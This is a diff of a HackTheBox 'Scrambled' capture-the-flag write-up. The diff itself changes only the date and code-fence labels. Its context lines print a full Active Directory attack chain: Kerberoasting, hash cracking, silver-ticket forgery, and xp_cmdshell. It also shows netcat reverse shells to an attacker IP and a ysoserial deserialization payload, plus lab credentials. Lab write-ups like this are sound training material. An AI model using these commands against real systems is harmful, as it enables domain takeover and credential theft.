@@ -1,6 +1,6 @@
 ---
 title: "Scrambled"
-date: 2025-06-20
+date: 2024-11-27
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.168
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 23:20 CET
 Nmap scan report for 10.10.11.168
@@ -111,7 +111,7 @@ It explains that all usernames submitted will have their password reset to the s
 
 With this, user `ksimpson:ksimpson` can enumerate shares using Kerberos and `impacket-smbclient`.
 
-```bash
+```shell
 $ impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -137,7 +137,7 @@ The only share we can access is `Public`, and there is a PDF file inside:
 
 With valid credentials, the most common thing to test is checking for kerberoastable users using Kerberos
 
-```bash
+```shell
 $ impacket-GetUserSPNs -dc-ip 10.10.11.168 scrm.local/ksimpson -request -k -dc-host dc1.scrm.local -request 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -156,7 +156,7 @@ $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$7e6ce0425e0f83246932a0d054edb6
 
 We have `sqlsvc` and, using `john`:
 
-```bash
+```shell
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hash       
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
@@ -172,7 +172,7 @@ So we have `sqlsvc:Pegasus60`. Let's try to connect to `mssql`.
 
 We have to connect using Kerberos, so we need the TGT. Now with `impacket-mssqlclient`:
 
-```bash
+```shell
 $ KRB5CCNAME=/home/kali/scrambled/sqlsvc.ccache impacket-mssqlclient dc1.scrm.local -k   
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -184,7 +184,7 @@ We can't, so as we have service account credentials, we could try to forge a sil
 
 First, the domain SID:
 
-```bash
+```shell
 $ impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -208,7 +208,7 @@ The NTLM hash can be converted online: `B999A16500B87D17EC7F2E2A68778F05`
 
 The SPN of the service is `mssql`, which we can get with `GetUserSPNs`:
 
-```bash
+```shell
 $ impacket-GetUserSPNs -dc-ip 10.10.11.168 scrm.local/ksimpson:ksimpson -request -k -dc-host dc1.scrm.local
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -222,7 +222,7 @@ MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2024
 
 Forge the ticket:
 
-```bash
+```shell
 $ impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local Administrator
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -242,7 +242,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 Now we can enter `mssql` with `Administrator` credentials:
 
-```bash
+```shell
 $ KRB5CCNAME=Administrator.ccache impacket-mssqlclient dc1.scrm.local -k  
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -259,7 +259,7 @@ SQL (SCRM\administrator  dbo@master)>
 
 Inside the DB, we have credentials:
 
-```bash
+```shell
 SQL (SCRM\administrator  dbo@master)> enum_db
 name         is_trustworthy_on   
 ----------   -----------------   
@@ -298,7 +298,7 @@ MiscSvc    ScrambledEggs9900   scrm.local                90               0
 
 We can execute shells if we enable `xp_cmdshell` and, using `xp_cmdshell 'cmd'`, we can do a reverse shell.
 
-```bash
+```shell
 SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
 INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
 INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement tstall.
@@ -320,7 +320,7 @@ SQL (SCRM\administrator  dbo@master)> xp_cmdshell "C:\Temp\nc.exe -e cmd 10.10.1
 
 ```
 
-```bash
+```shell
 $ nc -lnvp 443            
 listening on [any] 443 ...
 connect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 49597
@@ -353,7 +353,7 @@ PS C:\Users> Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { C
 Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { C:\Temp\nc.exe -e cmd 10.10.14.11 444 }
 ```
 
-```bash
+```shell
 $ nc -lnvp 444           
 listening on [any] 444 ...
 connect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 64158
@@ -367,7 +367,7 @@ scrm\miscsvc
 
 As this user, we can execute commands as the new user we found in the database and get another reverse shell.
 
-```bash
+```shell
 $ nc -lnvp 444           
 listening on [any] 444 ...
 connect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 64158
@@ -385,7 +385,7 @@ type user.txt
 
 With this new user, we can re-enumerate SMB shares. Now we can enter the `IT` folder, and there is the web tutorial app from before here.
 
-```bash
+```shell
 $ impacket-smbclient scrm.local/MiscSvc:ScrambledEggs9900@dc1.scrm.local -k
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -445,12 +445,12 @@ We see that the orders are being base64-encoded to the server. If we can send an
 
 So we can use `UPLOAD_ORDER;<serialized payload>`
 
-```bash
+```shell
 C:\Users\krovs\Downloads\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release>ysoserial.exe -g WindowsIdentity -f BinaryFormatter -o base64 -c "C:\Temp\nc.exe -e cmd 10.10.14.11 443"
 AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMUFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHhNU0EwTkRNaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==
 ```
 
-```bash
+```shell
 $ nc dc1.scrm.local 4411
 SCRAMBLECORP_ORDERS_V1.0.3;
 UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjMMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMTDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHhNU0EwTkRNaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1PbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1
@@ -458,7 +458,7 @@ ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the 
 
 ```
 
-```bash
+```shell
 $ nc -lnvp 443
 listening on [any] 443 ...
 connect to [10.10.14.11] from (UNKNOWN) [10.10.11.168] 62576
